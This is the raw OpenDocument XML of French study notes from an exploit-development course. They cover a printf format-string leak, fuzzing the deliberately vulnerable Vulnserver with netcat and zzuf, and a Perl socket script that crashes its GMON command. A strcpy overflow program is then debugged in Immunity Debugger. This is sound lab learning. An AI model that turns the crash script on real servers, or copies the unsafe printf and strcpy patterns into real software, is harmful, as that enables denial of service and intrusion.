      <text:p text:style-name="P23"><text:span text:style-name="T13">J'ai réussi à faire crash le programme en réessayant de faire tourner le programme et en ayant rajouté la ligne "</text:span><text:span text:style-name="T9">printf(buff);</text:span><text:span text:style-name="T13">" avant de libérer l'espace alloué par </text:span><text:span text:style-name="T9">malloc()</text:span><text:span text:style-name="T13">.</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P12">&gt; Vidéo 0203 :</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P9">On va maintenant se pencher sur une autre vulnérabilité, une "<text:span text:style-name="T1">format string vulnerability</text:span>". Si je veux afficher quelque chose en C/C++, on se servira en général de la fonction <text:span text:style-name="T2">printf()</text:span>. Comme dans la fonction ci-dessous :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:soft-page-break/><text:span text:style-name="T18">#include</text:span><text:span text:style-name="T29"> </text:span><text:span text:style-name="T21">&lt;stdio.h&gt;</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P20"><text:span text:style-name="T23">void</text:span><text:span text:style-name="T6"> main(</text:span><text:span text:style-name="T23">int</text:span><text:span text:style-name="T6"> </text:span><text:span text:style-name="T17">argc</text:span><text:span text:style-name="T6">, </text:span><text:span text:style-name="T23">char</text:span><text:span text:style-name="T6">** </text:span><text:span text:style-name="T17">argv</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P4">{</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T6"><text:tab/></text:span><text:span text:style-name="T27">//printf accepts multiple arguments</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T6"><text:tab/></text:span><text:span text:style-name="T27">//first argument is a format string</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T6"><text:tab/></text:span><text:span text:style-name="T27">//programmers often assume this is the only argument</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P20"><text:span text:style-name="T6"><text:tab/>printf(</text:span><text:span text:style-name="T17">argv</text:span><text:span text:style-name="T6">[1]);</text:span></text:p>
      <text:p text:style-name="P4">}</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P6">Dans ce cas, on permet à l'utilisateur de contrôler l'input qui va être affiché par la fonction <text:span text:style-name="T3">printf()</text:span>. Le problème, c'est qu'on peut appeler <text:span text:style-name="T3">printf()</text:span> et lui donner 1 argument, il affichera cet argument. Mais on peut également l'appeler et lui donner en premier argument un <text:span text:style-name="T1">format string</text:span><text:span text:style-name="T25">, ou une chaîne de format.</text:span></text:p>
      <text:p text:style-name="P11">[Livre PAGE 50-53 pour les chaînes de format]</text:p>
      <text:p text:style-name="P11">[Def %p page 55, affiche les adresses mémoires des variables]</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8">Techniquement, toutes les chaînes de caractères sont des chaînes de format, "Hello World" est une chaîne de format. Cependant, quand on parle de chaîne de format, on fait en général référence à des chaînes de format comprenant un "paramètre de format", <text:span text:style-name="T30">voir tableau page 50 livre</text:span>.</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8">Bref, on va faire apparaître le problème ici en compilant le programme et en l'utilisant. Si on fait simplement :</text:p>
      <text:p text:style-name="P16">./formatstring "Hello"</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8">Le programme se contentera d'afficher "Hello". Mais qu'est-ce qui se passerait si on faisait :</text:p>
      <text:p text:style-name="P16">./formatstring "%p %p %p"</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P6"><text:span text:style-name="T25">On a en output </text:span><text:span text:style-name="T4">0x7fffa603ab98 0x7fffa603abb0 0x7f061aaad718</text:span><text:span text:style-name="T25">. Ce sont des adresses mémoire (avec 12 digits parce qu'on a une architecture x64 ; en architecture x32, on a des adresses avec 8 digits, comme dans le livre). Et lorsqu'on a en résultat une adresse mémoire, ça veut dire qu'on a affiché le contenu d'un pointeur en mémoire ; on verra plus tard comment prendre avantage d'un tel comportement d'un programme.</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P12">&gt; Vidéo 0204 :</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P9">Ici, on va parler d'une autre vulnérabilité, le <text:span text:style-name="T1">fuzzing</text:span>. Le <text:span text:style-name="T1">fuzzing </text:span>va nous permettre d'envoyer des différentes données à une application, jusqu'à la faire crash, ce qui permet de révéler qu'il existe bien une vulnérabilité.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Pour faire crash nos programmes jusqu'ici, on a utilisé des inputs utilisateurs depuis la ligne de commande. Cela peut arriver, mais le plus souvent on aura des applications vulnérables qui seront accessibles via un réseau, et qu'on va <text:span text:style-name="T1">fuzz </text:span>via un réseau. Pour illustrer ça, on va installer Vulnserver sur notre machine hôte Windows 10 (<text:a xlink:type="simple" xlink:href="http://www.thegreycorner.com/p/vulnserver.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://www.thegreycorner.com/p/vulnserver.html</text:a> : download, extract, lancer le .exe, plutôt simple).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P12">&gt; Vidéo 0205 :</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P9">Avant d'aller <text:span text:style-name="T1">fuzzer </text:span>notre serveur vulnérable, on va installer un petit outil de <text:span text:style-name="T1">fuzzing </text:span>d'applications, zzuf (apt-get install zzuf).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:soft-page-break/>Pour fuzz, on va d'abord lancer notre serveur vulnérable sur notre machine Windows. Sur notre machine Kali, on va se connecter au serveur vulnérable avec netcat :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P17">nc 192.168.1.10 9999</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On est alors connecté au serveur vulnérable. En tapant HELP, on voit la liste des commandes disponibles. On peut tout à fait entrer la commande suivante pour automatiser ces deux actions, et ne pas avoir à se connecter manuellement au serveur :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P17">echo "HELP" | nc 192.168.1.10 9999</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Sauf que cela ne clôt pas la connection après avoir envoyé "HELP". Workaround :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P17">echo "HELP" | nc -q1 192.168.1.10 9999</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Avec cette commande, on envoie bien "HELP" puis on clôt directement la connection après.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">A partir de là, on voudrait avoir un moyen d'automatiser l'envoi de longues chaînes de caractères à notre serveur vulnérable, pour voir si une des commandes ne serait pas vulnérable à un <text:span text:style-name="T1">buffer overflow</text:span>.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P12">&gt; Vidéo 0206 :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P10">[Page 140-141 du livre]</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">L'idée c'est que pour automatiser l'envoi de longues chaînes de caractères, on peut utiliser des langages tels que le python, ou perl :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P15"><text:span text:style-name="T31">echo "HELP $(python -c 'print "A" * 30')" | </text:span><text:span text:style-name="T31">nc -q1 192.168.1.10 9999</text:span></text:p>
      <text:p text:style-name="P14">echo "HELP $(perl -e 'print "A" x 30;')" | nc -q1 192.168.1.10 9999</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On peut inclure une commande dans notre commande au travers de $(commande...), ou par des accents `commande`. Mais les parenthèses sont plus lisibles. Bref, on entre cette commande pour essayer de faire crash le serveur :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P3"><text:span text:style-name="T11">echo "HELP $(perl -e 'print "A" x 5000;')" | nc -q1 192.168.1.10 9999</text:span><text:span text:style-name="T15"> </text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Et on s'aperçoit qu'en output on récupère désormais un UNKNOWN COMMAND. On va s'arrêter là, et créer deux fichiers, test.txt et test2.txt, avec les contenus suivants :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P17">echo "HELP $(python -c "print 'A' * 5000")" &gt; test.txt</text:p>
      <text:p text:style-name="P17">echo "GMON ./:/ $(python -c "print 'A' * 5000")" &gt; test2.txt</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Ces deux fichiers nous serons utiles plus tard, pour <text:span text:style-name="T1">fuzz</text:span>. Mais pour fuzz, on va parfois avoir besoin de junk datas, et pas seulement de lettres. C'est là que zzuf va pouvoir nous être utile. La commande de base de zzuf est :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P17">zzuf cat test2.txt</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Cette commande va nous output dans le terminal le résultat de <text:span text:style-name="T2">cat test2.txt</text:span>, mais avec un certain taux de junk data venant remplacer une partie du contenu. Pour changer le ratio de ce qui va <text:soft-page-break/>être remplacé par des junk datas, on utilise le flag "-r" :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P17">zzuf -r 0.10 cat test2.txt</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Ici, 10% du contenu sera modifié. Notre problème, c'est qu'on ne veut pas modifier le tout début de mon fichier, qui initie la commande. On va, pour éviter ça, utiliser le flag "-b" :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P17">zzuf -b12- cat test2.txt &gt; fuzz.txt</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Ici, on commence après les 12 premiers bytes (donc après les 12 premiers caractères puisque 1 caractère = 1 byte). On sauvegarde le résultat dans le fichier fuzz.txt. On essaie maintenant de faire crash notre serveur en entrant :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P17">cat fuzz.txt | nc 192.168.1.10 9999</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Ce qui fait complètement crash notre serveur sur la machine hôte.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P12">&gt; Vidéo 0207 :</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P3"><text:span text:style-name="T15">Dans cette vidéo, l'idée va être de créer un simple script pour automatiser notre </text:span><text:span text:style-name="T16">fuzzing</text:span><text:span text:style-name="T15"> avec perl. Ce script est assez simple, et ressemble à ceci :</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P28">#!/usr/bin/perl</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P27">### Loads standard socket librairy</text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T28">use</text:span> <text:span text:style-name="T24">IO::</text:span>Socket;</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P27">###Define default variables. If the user specified parameters, use these instead</text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T32">$ipAddr</text:span> <text:span text:style-name="T33">=</text:span> <text:span text:style-name="T34">"192.168.1.10"</text:span>;</text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T32">$ipPort</text:span> <text:span text:style-name="T33">=</text:span> <text:span text:style-name="T34">"9999"</text:span>;</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26"><text:span text:style-name="T28">if</text:span> (<text:span text:style-name="T32">$ARGV</text:span>[<text:span text:style-name="T33">1</text:span>] <text:span text:style-name="T35">ne</text:span> <text:span text:style-name="T34">''</text:span>)</text:p>
      <text:p text:style-name="P26">{</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/><text:span text:style-name="T32">$ipAddr</text:span> <text:span text:style-name="T33">=</text:span> <text:span text:style-name="T32">$ARGV</text:span>[<text:span text:style-name="T33">0</text:span>];</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/><text:span text:style-name="T32">$ipPort</text:span> <text:span text:style-name="T33">=</text:span> <text:span text:style-name="T32">$ARGV</text:span>[<text:span text:style-name="T33">1</text:span>];</text:p>
      <text:p text:style-name="P26">}</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P27">###Create the payload</text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T32">$command</text:span> <text:span text:style-name="T33">=</text:span> <text:span text:style-name="T34">"GMON ./:/"</text:span>;</text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T32">$command</text:span> <text:span text:style-name="T33">.=</text:span> <text:span text:style-name="T34">'A'</text:span> x <text:span text:style-name="T33">1000</text:span>;</text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T32">$command</text:span> <text:span text:style-name="T33">.=</text:span> <text:span text:style-name="T34">'B'</text:span> x <text:span text:style-name="T33">1000</text:span>;</text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T32">$command</text:span> <text:span text:style-name="T33">.=</text:span> <text:span text:style-name="T34">'C'</text:span> x <text:span text:style-name="T33">1000</text:span>;</text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T32">$command</text:span> <text:span text:style-name="T33">.=</text:span> <text:span text:style-name="T34">'D'</text:span> x <text:span text:style-name="T33">1000</text:span>;</text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T32">$command</text:span> <text:span text:style-name="T33">.=</text:span> <text:span text:style-name="T34">'E'</text:span> x <text:span text:style-name="T33">1000</text:span>;</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P27">###Create the socket</text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T32">$socket</text:span> <text:span text:style-name="T33">=</text:span> <text:span text:style-name="T24">IO::Socket::</text:span>INET<text:span text:style-name="T33">-&gt;</text:span><text:span text:style-name="T28">new</text:span>(</text:p>
      <text:p text:style-name="P26"><text:soft-page-break/><text:s text:c="8"/>Proto<text:span text:style-name="T33">=&gt;</text:span><text:span text:style-name="T34">"tcp"</text:span>,</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>PeerAddr<text:span text:style-name="T33">=&gt;</text:span><text:span text:style-name="T32">$ipAddr</text:span>,</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>PeerPort<text:span text:style-name="T33">=&gt;</text:span><text:span text:style-name="T32">$ipPort</text:span>) <text:span text:style-name="T35">or</text:span> <text:span text:style-name="T26">die</text:span> <text:span text:style-name="T34">"Cannot connect to $ipAddr, $ipPort"</text:span>;</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P27">### Receive 1024 bits (corresponding to the banner of the vulnerable server)</text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T32">$socket</text:span><text:span text:style-name="T33">-&gt;</text:span><text:span text:style-name="T26">recv</text:span>(<text:span text:style-name="T32">$returnedData</text:span>, <text:span text:style-name="T33">1024</text:span>);</text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T28">print</text:span> <text:span text:style-name="T32">$returnedData</text:span>;</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P27">###Send the payload</text:p>
      <text:p text:style-name="P34"><text:span text:style-name="T32">$socket</text:span><text:span text:style-name="T33">-&gt;</text:span><text:span text:style-name="T26">send</text:span>(<text:span text:style-name="T32">$command</text:span>);</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Mais on va également vouloir examiner plus précisément le crash du programme vulnserver : quand est-ce qu'il crash ? Au bout de combien de caractères affichés ?</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Pour cela, on ouvre ollydbg, on clique sur "Attach", et on s'attache au processus du serveur. Tant qu'aucune autre intéraction n'est faîte avec vulnserveur, ollydbg montre, en bas à droite, que le process est "Paused", c'est normal.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On clique sur "Run" dans ollydbg, pour que le programme vulnserver tourne. Ensuite, on exécute notre script perl sur la machine kali.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Ce qu'il se passe :</text:p>
      <text:list xml:id="list2464705659900371199" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P37">Dans ollydbg, le programme se met sur "Paused" : il a crash.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P37">En bas du débuggeur, on lit "Access violation when writing to...", ce qui est la cause du crash.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P37">On voit que le registre ECX est rempli de D, et que le registre EBP est rempli d'1 B, puis de C.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Le débuggueur nous propose de passer l'exception qui est arrivée au programme (avec Shift + F7/F8/F9), mais je suppose que ça ferait crash le programme.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P12">&gt; Vidéo 0208 :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Le tout maintenant c'est d'utiliser les informations d'ollydbg pour ne pas simplement faire crash le programme, mais l'amener à exécuter nos commandes.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Mais dans cette vidéo, on va d'abord se pencher sur le langage assembleur.</text:p>
      <text:p text:style-name="P10">[PAGE 21 – 40 du livre]</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P9">On crée tout d'abord un simple programme de buffer overflow, assez similaire à ceux du livre :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P32">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P31">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26"><text:span text:style-name="T36">int</text:span> <text:span text:style-name="T22">functionFunction</text:span>(<text:span text:style-name="T36">char</text:span><text:span text:style-name="T33">*</text:span> param)</text:p>
      <text:p text:style-name="P26">{</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/><text:span text:style-name="T36">char</text:span><text:span text:style-name="T33">*</text:span> localString <text:span text:style-name="T33">=</text:span> <text:span text:style-name="T34">"functionFunction"</text:span>; <text:s/><text:span text:style-name="T37">/* Will help us locate stuff in memory */</text:span></text:p>
      <text:p text:style-name="P26"><text:soft-page-break/><text:s text:c="8"/><text:span text:style-name="T36">int</text:span> localInt <text:span text:style-name="T33">=</text:span> <text:span text:style-name="T33">0xffeeddcc</text:span>;</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/><text:span text:style-name="T36">char</text:span> localstring2[<text:span text:style-name="T33">10</text:span>];</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>strcpy(localstring2, param); <text:s text:c="3"/><text:span text:style-name="T37">/* Might overflow since the buffer size is 9 caracters + null caracter */</text:span></text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26"><text:s text:c="8"/><text:span text:style-name="T28">return</text:span> <text:span text:style-name="T33">1</text:span>;</text:p>
      <text:p text:style-name="P26">}</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26"><text:span text:style-name="T36">int</text:span> <text:span text:style-name="T22">main</text:span> (<text:span text:style-name="T36">int</text:span> argc, <text:span text:style-name="T36">char</text:span> <text:span text:style-name="T33">*</text:span>argv[])</text:p>
      <text:p text:style-name="P26">{</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/><text:span text:style-name="T36">char</text:span><text:span text:style-name="T33">*</text:span> localString <text:span text:style-name="T33">=</text:span> <text:span text:style-name="T34">"main function"</text:span>;</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/><text:span text:style-name="T36">int</text:span> localInt <text:span text:style-name="T33">=</text:span> <text:span text:style-name="T33">0x11223344</text:span>;</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26"><text:s text:c="8"/>functionFunction(argv[<text:span text:style-name="T33">1</text:span>]);</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26"><text:s text:c="8"/><text:span text:style-name="T28">return</text:span> <text:span text:style-name="T33">0</text:span>;</text:p>
      <text:p text:style-name="P34">}</text:p>
      <text:p text:style-name="P9">Ensuite, on le compile avec gcc sous Linux :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P17">gcc stackoverflow.c -o stackoverflow</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On ouvre ensuite notre exécutable avec ImmunityDebugger. Nevermind, ImmunityDebugger prend les fichiers .exe uniquement. Je vais essayer de compiler mon code source en C à partir de l'IDE Visual Studio. En fait, le compilateur C de Visual Studio est son compilateur C++. Je crée donc un projet C++, je choisis "Command Line Application", je rename le projet, et spécifie sa localisation.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Je crée un projet vide, puis y ajoute 1 seul fichier .cpp, que je renomme en .c, pour que le compilateur l'interprète bien comme du code en C.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Je copie-colle le code ci-dessus, puis je compile le programme. La version .exe se trouvera bien dans le dossier spécifié ; bref, ça fonctionne assez bien pour compiler du C sous Windows. Pour examiner cet exécutable Windows, j'ai installé Immunity Debugger sur mon hôte Windows.</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">BREF, on a écrit notre petit programme en C, on l'a compilé avec Visual Studio, et maintenant on l'ouvre avec Immunity Debugger, qu'on a installé.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Dans Immunity Debugger, en haut à gauche on a notre programme désassemblé (en machine code et en assembleur), en haut à droite, l'état des registres, en bas à gauche, le hexdump de la mémoire et en bas à droite, l'état de la pile.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Intéressons nous au programme désassemblé. La première chose qu'on voit (suite à une série de commandes JMP et INT3), c'est ceci :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr1" draw:name="images1" text:anchor-type="paragraph" svg:width="18.223cm" svg:height="6.228cm" draw:z-index="0"><draw:image xlink:href="Pictures/2000000700007112000026A8D9511B12.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P9">On voit le nom de notre fonction (variable localstring), ainsi que la variable FFEEDDCC qu'on a définit dans notre fonction (variable localInt).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Un peu plus loin, on voit <text:span text:style-name="T2">MOV EAX, 1 </text:span>: on met la valeur "1" quelque part.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On voit un schéma similaire plus bas, pour la fonction main et ses variables :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr1" draw:name="images2" text:anchor-type="paragraph" svg:width="18.999cm" svg:height="2.468cm" draw:z-index="1"><draw:image xlink:href="Pictures/2000000700007A7A00000FEC8CEB93BC.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">On finit par avoir une instruction <text:span text:style-name="T2">CALL</text:span>, qui est un appel fait à l'emplacement de mémoire <text:span text:style-name="T2">008B110E</text:span>. Cet emplacement de mémoire est tout au début du programme, et correspond à cette ligne :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images3" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="0.594cm" draw:z-index="2"><draw:image xlink:href="Pictures/200000070000471C0000027C6B37A257.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Ce qui indique donc au programme de sauter à la fonction "functionFunction". Logique, puisque suite à la définition des variables dans main, on appelle bien la fonction functionFunction.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On finit ensuite par une instruction <text:span text:style-name="T2">RETN</text:span> un peu plus bas. </text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P12">&gt; Vidéo 0209 :</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P9">[Je me suis arrêté, les adresses seront différentes mais on est toujours sur le même programme]</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Intéressant : pour évaluer quelle partie va avec quelle fonction, c'est indiqué dans la seconde colonne sur ImmunityDebugger :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr3" draw:name="images4" text:anchor-type="paragraph" svg:width="14.737cm" svg:height="1.536cm" draw:z-index="3"><draw:image xlink:href="Pictures/2000000700003992000006005022182B.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Intéressant 2 : pour que notre programme fonctionne correctement, et qu'on puisse également le <text:soft-page-break/>débugger correctement, il a besoin d'arguments. Pour lui donner des arguments, on va dans "Debug", puis "Arguments", et on donne nos arguments. ImmunityDebugger les garde en cache, et à chaque fois qu'on ré-ouvre le programme, il conserve ces arguments. On donne à notre programme l'argument 123456789.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Maintenant, on va définir un "breakpoint". On clic droit à une adresse mémoire, puus dans "Breakpoint", on clique sur "Toggle". On a maintenant un point d'arrêt à une adresse du programme, qui va s'exécuter jusqu'à cette adresse, puis s'arrêter pour nous montrer l'état des registres, de la pile... Notre breakpoint se situe ici (surligné en turquoise) :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images5" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="0.534cm" draw:z-index="4"><draw:image xlink:href="Pictures/2000000700007C8B000003EE94391F71.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Une fois qu'on a définit notre breakpoint, on clique simplement sur "run".</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">[Brève explication de la pile, très brève, voir livre pour plus de détail]</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Une fois que le programme s'est arrêté au breakpoint, on a la possibilité de faire en sorte que le programme exécute une instruction après l'autre suite au point d'arrêt, en cliquant sur "Step Into". On step into différentes instructions, sans trop d'effet sur la pile :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images7" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="2.51cm" draw:z-index="6"><draw:image xlink:href="Pictures/20000007000061FC00000E79648A3A7F.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><draw:frame draw:style-name="fr4" draw:name="images11" text:anchor-type="paragraph" svg:x="0cm" svg:y="2.508cm" svg:width="16.999cm" svg:height="0.415cm" draw:z-index="10"><draw:image xlink:href="Pictures/200000070000509F000001F85D9BFBEB.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">État de la pile :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images6" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="2.836cm" draw:z-index="5"><draw:image xlink:href="Pictures/20000007000051C200000DA61F2582A8.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Et la pile se termine bien à l'adresse 008FFDF8 (ce qu'il y a au-dessus ce n'est pas la pile), comme on le voit grâce au registre ESP qui contient cette adresse.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Ensuite, quand on Step Into l'instruction suivante (CALL), qui est l'appel à la fonction "functionFunction", la valeur 123456789 est empilée :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images8" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="2.046cm" draw:z-index="7"><draw:image xlink:href="Pictures/20000007000050B9000009B8CE1C2AA8.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Ce qui est normal, on empile en premier, dans le bloc d'activation, les arguments de la fonction appelée <text:span text:style-name="T30">[Voir livre page 76]</text:span>.</text:p>
      <text:p text:style-name="P9"><text:soft-page-break/></text:p>
      <text:p text:style-name="P9">Quand on fait un autre "Step Into", on se retrouve bien à l'adresse 005A110E :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images9" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="1.362cm" draw:z-index="8"><draw:image xlink:href="Pictures/2000000700006216000007DC7A2081FB.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Qui nous fait "sauter" dans la fonction "functionFunction". L'adresse de retour est empilée à son tour, puisque la pile ressemble alors à ça :</text:p>
      <text:p text:style-name="P9"/>
